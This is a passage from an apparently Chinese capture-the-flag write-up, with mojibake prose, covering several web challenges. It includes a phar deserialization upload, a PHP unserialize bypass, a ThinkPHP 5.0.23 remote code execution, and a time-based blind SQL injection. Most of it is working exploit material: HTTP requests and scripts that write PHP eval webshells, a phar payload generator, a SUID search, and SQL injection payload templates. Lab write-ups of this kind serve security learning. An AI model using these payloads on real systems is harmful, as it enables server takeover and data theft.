class="operator">-</span><span class="operator">-</span><span class="operator">-</span><span class="operator">-</span><span class="title class_">WebKitFormBoundaryPASYrq</span>SA9GBt07ei</span></span><br><span class="line"><span class="language-wren"><span class="title class_">Content</span><span class="operator">-</span><span class="title class_">Disposition</span>: form<span class="operator">-</span><span class="variable">data</span>; <span class="variable">name</span><span class="operator">=</span><span class="string">&quot;file&quot;</span>; <span class="variable">filename</span><span class="operator">=</span><span class="string">&quot;exp.jpg&quot;</span></span></span><br><span class="line"><span class="language-wren"><span class="title class_">Content</span><span class="operator">-</span><span class="title class_">Type</span>: <span class="variable">image</span>/<span class="title function_">jpeg</span></span></span><br><span class="line"><span class="language-wren"></span></span><br><span class="line"><span class="language-wren">&#123;&#123;<span class="title function_">unquote</span>(<span class="string">&quot;\x1f\x8b<span class="char escape_">\x08</span><span class="char escape_">\x08</span>7\x0d<span class="char escape_">\x97</span>h<span class="char escape_">\x00</span><span class="char escape_">\x03</span>phar.jpg<span class="char escape_">\x00</span>s\xf7t\xb3\xb0L\xb4\xb1/\xc8<span class="char escape_">\x28</span>P<span class="char escape_">\x88</span>\x8f\xf7p\xf4<span class="char escape_">\x09</span><span class="char escape_">\x89</span>w\xf6\xf7\x0d\xf0\xf4q\x0d\xd2\xd0\xb4V\xb0\xb7\xe3\xe5\xeaa```<span class="char escape_">\x04</span>bA<span class="char escape_">\x28</span>\xcd\xc0<span class="char escape_">\x10</span><span class="char escape_">\x09</span>\xc4\xfeV&amp;VJn9<span class="char escape_">\x89</span>\xe9JV<span class="char escape_">\x86</span>V\xd5\xc5V\xc6VJ\xc9\xb9<span class="char escape_">\x29</span>J\xd6\xc5V\xa6fVJ\xa9\xc9<span class="char escape_">\x19</span>\xf9\x0a\xea<span class="char escape_">\x10</span>c\x1dR\xcb<span class="char escape_">\x12</span>s4T\xe2<span class="char escape_">\x03</span>\xfc<span class="char escape_">\x83</span>C\xa2\x0dc5\xad\xd5<span class="char escape_">\x15</span>\xec<span class="char escape_">\x14</span>\xf4\xcb<span class="char escape_">\x12</span>\x8b\xf4\xcb\xcb\xcb\xf53Jrs\xf4\x8b3Rsr\xf4<span class="char escape_">\x80</span>\x8a<span class="char escape_">\x95</span>\xackY<span class="char escape_">\x81</span><span class="char escape_">\x86</span>&#x27;\xea<span class="char escape_">\x95</span>T<span class="char escape_">\x94</span><span class="char escape_">\x80</span>\xec2\xe7\x9d\x9e<span class="char escape_">\x01</span>\xa2\x9b\xc5\xee\xf4l<span class="char escape_">\x83</span>X\xceP\xc1\xb1<span class="char escape_">\x84</span>W\xceqj\x9d\xdb\xb7\xa5\xe7\xb4W\xab\xf2_\xb6mxo\xc2<span class="char escape_">\x04</span><span class="char escape_">\x94</span>pw\xf2u<span class="char escape_">\x02</span><span class="char escape_">\x00</span>\x1e\xf6\xb4<span class="char escape_">\x95</span>\xd0<span class="char escape_">\x00</span><span class="char escape_">\x00</span><span class="char escape_">\x00</span>&quot;</span>)&#125;&#125;</span></span><br><span class="line"><span class="language-wren"><span class="operator">-</span><span class="operator">-</span><span class="operator">-</span><span class="operator">-</span><span class="operator">-</span><span class="operator">-</span><span class="title class_">WebKitFormBoundaryPASYrq</span>SA9GBt07ei<span class="operator">-</span><span class="operator">-</span></span></span><br><span class="line"><span class="language-wren"></span></span><br></pre></td></tr></table></figure>

<p>Â∞±ÊàêÂäügetshell‰∫Ü</p>
<h2 id="Unserialize-Again"><a href="#Unserialize-Again" class="headerlink" title="Unserialize Again"></a>Unserialize Again</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;human&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>!=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$fffflag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;AshenOne&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eating=<span class="string">&#x27;fire&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user.<span class="variable language_">$this</span>-&gt;pass;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;pass==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$nothing</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;God==<span class="string">&#x27;true&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;eating);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Get Out!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;                 </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// $Eden=new story();</span></span><br><span class="line">    <span class="variable">$pear</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>];</span><br><span class="line">    <span class="variable">$Adam</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$pear</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="title function_ invoke__">file_exists</span>(<span class="variable">$Adam</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Â§öÂêÉÈõ™Ê¢®&#x27;</span>;</span><br><span class="line">&#125; Â§öÂêÉÈõ™Ê¢®</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ÁªïËøáwakeupÂ∞±ÂèØ‰ª•‰ªªÊÑèÊâßË°åÂëΩ‰ª§‰∫ÜÔºåÈÄöËøá<code>file_put_contents</code>ÂÜôÂÖ•Ôºå‰ΩÜÊòØÊúâÂæàÊòéÊòæÁöÑÈùûÈ¢ÑÊúü</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/pairing.php?pear=/var/www/html/shell.php&amp;apple=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>87f4ec66-e850-47fc-a734-116600759b85.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>looklook=pairing.php</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-llvm"><span class="variable">%3</span><span class="keyword">c</span><span class="variable">%3</span>f<span class="variable">%70</span><span class="variable">%68</span><span class="variable">%70</span><span class="variable">%20</span><span class="variable">%40</span><span class="variable">%65</span><span class="variable">%76</span><span class="variable">%61</span><span class="variable">%6</span><span class="keyword">c</span><span class="variable">%28</span><span class="variable">%24</span><span class="variable">%5</span>f<span class="variable">%50</span><span class="variable">%4</span>f<span class="variable">%53</span><span class="variable">%54</span><span class="variable">%5</span>b<span class="variable">%31</span><span class="variable">%5</span>d<span class="variable">%29</span><span class="variable">%3</span>b</span></span><br></pre></td></tr></table></figure>

<p>È¢ÑÊúüÁöÑËØùÂ∞±ÊòØ‰øÆÊîπÂ±ûÊÄßÊï∞ÈáèÂéªÁªïËøáwakeupÂÆûÁé∞getshell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span> = <span class="string">&#x27;admin&#x27;</span>, <span class="variable">$pass</span> = <span class="literal">null</span>, <span class="variable">$eating</span> = <span class="string">&quot;echo &#x27;&lt;?php @eval(\$_POST[1]);&#x27; &gt; /var/www/html/test.php&quot;</span>, <span class="variable">$God</span> = <span class="string">&#x27;true&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user   = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass   = <span class="variable">$pass</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eating = <span class="variable">$eating</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;God    = <span class="variable">$God</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">story</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;phar.jpg&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&#x27;phar.phar&#x27;</span>, <span class="string">&#x27;phar.jpg&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gzip, urllib.parse, requests</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://87f4ec66-e850-47fc-a734-116600759b85.node5.buuoj.cn:81/pairing.php&quot;</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8083&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https&quot;</span>: <span class="string">&quot;http://127.0.0.1:8083&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;phar.jpg&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">s = data[:-<span class="number">28</span>]</span><br><span class="line">h = data[-<span class="number">8</span>:]</span><br><span class="line">fixed = s + sha1(s).digest() + h</span><br><span class="line"></span><br><span class="line">compressed = gzip.compress(fixed)</span><br><span class="line">encoded = urllib.parse.quote_from_bytes(compressed)</span><br><span class="line"></span><br><span class="line">pear_path = <span class="string">&quot;/var/www/html/a.jpg&quot;</span></span><br><span class="line">apple_path = <span class="string">&quot;phar:///var/www/html/a.jpg/test.txt&quot;</span></span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;pear&quot;</span>: pear_path,</span><br><span class="line">    <span class="string">&quot;apple&quot;</span>: apple_path</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url+<span class="string">f&quot;?pear=<span class="subst">&#123;pear_path&#125;</span>&amp;apple=<span class="subst">&#123;apple_path&#125;</span>&quot;</span>, data=encoded, proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../images/achieve/2025/8/newstar2023/PixPin_2025-08-09_17-36-14.png" alt="1"></p>
<h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p>TP5.0.23RCE</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?s=captcha</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>181</span><br><span class="line"></span><br><span class="line"><span class="language-oxygene">_method=__construct&amp;filter[]=phpinfo&amp;<span class="keyword">method</span>=<span class="title function_">get</span>&amp;<span class="title function_">server</span>[<span class="title function_">REQUEST_METHOD</span>]=1</span></span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?s=captcha</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>181</span><br><span class="line"></span><br><span class="line"><span class="language-php-template"><span class="language-xml">_method=__construct&amp;filter[]=exec&amp;method=get&amp;server[REQUEST_METHOD]=echo%20&#x27;</span><span class="language-php"><span class="meta">&lt;?php</span>%<span class="number">20</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27;%20&gt;%20/var/www/public/shell.php</span></span></span><br></pre></td></tr></table></figure>

<p>ÈìæÊé•‰∏äÊù•ÂèëÁé∞Ê≤°ÊúâÊùÉÈôêËØªÂèñÊ†πÁõÆÂΩïÁöÑflag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> <span class="string">&quot;/flag_dd3f6380aa0d&quot;</span> /dev/stdout</span><br></pre></td></tr></table></figure>

<h2 id="Final-round"><a href="#Final-round" class="headerlink" title="Final round"></a>Final round</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/comments.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>bdca54d0-4290-4e38-bd20-a9bc6eb03661.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://bdca54d0-4290-4e38-bd20-a9bc6eb03661.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://bdca54d0-4290-4e38-bd20-a9bc6eb03661.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>12</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">name</span>=<span class="number">1</span>%<span class="number">0</span>band%<span class="number">0</span>bif(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">80</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span></span><br></pre></td></tr></table></figure>

<p>ÊàêÂäüÂª∂Êó∂ÔºåÂÜôËÑöÊú¨ÁöÑÊó∂ÂÄôÂèëÁé∞ËØØÂØºÂæàÂ§öÔºå‰ªñÊúâÂæàÂ§öË°®ÂíåÂàóÔºåÊúÄÂêéÁöÑÊó∂ÂÄôËøò‰∏çËÉΩÁõ¥Êé•Êü•textÔºå‰∏çÁÑ∂Â∫îËØ•‰ºöÊõ¥Âø´ÁÇπ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bdca54d0-4290-4e38-bd20-a9bc6eb03661.node5.buuoj.cn:81/comments.php&quot;</span></span><br><span class="line">SLEEP, TH = <span class="number">3</span>, <span class="number">2.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tpl = &quot;1%0band%0bif(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(&#123;SLEEP&#125;),1)&quot;</span></span><br><span class="line"><span class="comment"># wfy</span></span><br><span class="line"><span class="comment"># tpl = &quot;1%0band%0bif(ascii(substr((select%0bgroup_concat(table_name)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=&#x27;wfy&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(&#123;SLEEP&#125;),1)&quot;</span></span><br><span class="line"><span class="comment"># tpl = &quot;1%0band%0bif(ascii(substr((select%0bgroup_concat(table_name)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(&#123;SLEEP&#125;),1)&quot;</span></span><br><span class="line"><span class="comment"># wfy_admin,wfy_comments,wfy_information</span></span><br><span class="line"><span class="comment"># tpl = &quot;1%0band%0bif(ascii(substr((select%0bgroup_concat(column_name)%0bfrom%0binformation_schema.columns%0bwhere%0btable_name=&#x27;wfy_admin&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(&#123;SLEEP&#125;),1)&quot;</span></span><br><span class="line"><span class="comment"># 